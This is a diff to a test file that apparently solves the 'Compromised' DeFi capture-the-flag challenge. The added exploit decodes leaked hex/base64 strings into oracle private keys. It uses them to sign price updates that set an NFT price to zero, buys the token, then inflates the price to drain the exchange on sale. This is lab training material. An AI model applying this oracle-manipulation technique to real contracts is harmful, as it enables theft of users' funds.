@@ -47,7 +47,50 @@ describe('Compromised challenge', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        const leakToPrivateKey = hexBytes => {
+            const base64 = Buffer.from(hexBytes.split(` `).join(``), `hex`).toString(`utf8`)
+            return Buffer.from(base64, `base64`).toString(`utf8`)
+        }
+
+        const keys = [
+              `4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35`,
+              `4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34`
+        ].map(leakToPrivateKey)
+
+        const postPrice = async (price) => {
+            const txdata = await this.oracle.contract.methods.postPrice("DVNFT", price)
+            const tx = {
+                to: this.oracle.address,
+                data: txdata.encodeABI(),
+                gas: 50000
+            };
+
+            for (const key of keys) {
+                const signedtx = await web3.eth.accounts.signTransaction(tx, key);
+                await web3.eth.sendSignedTransaction(signedtx.rawTransaction);
+            }
+        }
+
+        // Initial state
+        console.log("1: DVNFT Price:",web3.utils.fromWei(await this.oracle.getMedianPrice("DVNFT")),"ETH");
+
+        // Update oracle price to 0
+        await postPrice(0);
+        console.log("2: DVNFT Price:",web3.utils.fromWei(await this.oracle.getMedianPrice("DVNFT")),"ETH");
+
+        // Purchase token for free
+        await this.exchange.buyOne({from: attacker, value: 1});
+        console.log('3: Token Purchased')
+
+        // Update oracle price to all exchange balance
+        // const exchangeBalance = await balance.current(this.exchange.address);
+        await postPrice(EXCHANGE_INITIAL_ETH_BALANCE.toString());
+        console.log("4: DVNFT Price:",web3.utils.fromWei(await this.oracle.getMedianPrice("DVNFT")),"ETH");
+
+        // Approve transfer and sell token for the new price
+        await this.token.approve(this.exchange.address, 1, {from:attacker});
+        await this.exchange.sellOne(1, {from: attacker});
+        console.log('5: Token Sold')
     });
 
     after(async function () {
